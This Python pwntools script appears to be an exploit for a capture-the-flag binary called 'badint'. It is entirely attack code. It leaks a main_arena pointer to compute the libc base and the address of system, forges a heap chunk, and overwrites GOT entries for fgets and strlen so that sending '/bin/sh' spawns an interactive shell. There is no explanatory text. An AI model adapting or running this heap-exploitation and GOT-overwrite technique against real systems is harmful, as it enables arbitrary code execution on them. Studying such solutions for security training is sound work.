from pwn import *
import time
import re

context.binary = "./badint"
#context.log_level = "debug"
p = process(["./badint"])

debug = True
prog = log.progress("Exploit ")
if debug:
    log.success("pid : " + str(proc.pidof(p)[0]))
    pause()

def seq_offset_data(seq, offset, data, LSF):
    p.recvuntil("SEQ #: ")
    p.sendline(str(seq))
    p.recvuntil("Offset: ")
    p.sendline(str(offset))
    p.recvuntil("Data: ")
    p.sendline(data)
    p.recvuntil("LSF Yes/No: ")
    if LSF:
        p.sendline("Yes")
    else:
        p.sendline("No")


seq_offset_data(0, 8, ("B" * 0x80).encode("hex"), True)

leak = p.recvuntil("0000").split(":")[2].strip()
leak = u64(leak.decode("hex")) - 88
log.success("main_arena : " + hex(leak))
libc_base = leak - 0x3c4b20
system = libc_base + 0x45390
log.success("libc_base : " + hex(libc_base))
log.success("system : " + hex(system))


prog.status("Make Fake Chunk")

seq_offset_data(0, 0, "A" * 0x68 * 2, True)
seq_offset_data(0, 0, "B" * 0x38 * 2, True)

exp = p64(0x604042).encode("hex")
exp += p64(0).encode("hex") * 6
exp += p64(0x51).encode("hex")
exp += '0' * ( 0x68 * 2 - len(exp) )
seq_offset_data(0, 0x1d0, exp, True)

fgets_plt = 0x400b20
strlen_plt = 0x400b30

exp = "C" * 12
exp += p64(fgets_plt + 6).encode("hex")
exp += p64(strlen_plt + 6).encode("hex")
exp += p64(system).encode("hex")
exp += "C" * (110 - len(exp))

seq_offset_data(0, 0, exp, False)
p.sendlineafter("SEQ #: ", "/bin/sh")

prog.status("Get Shell")
p.interactive()
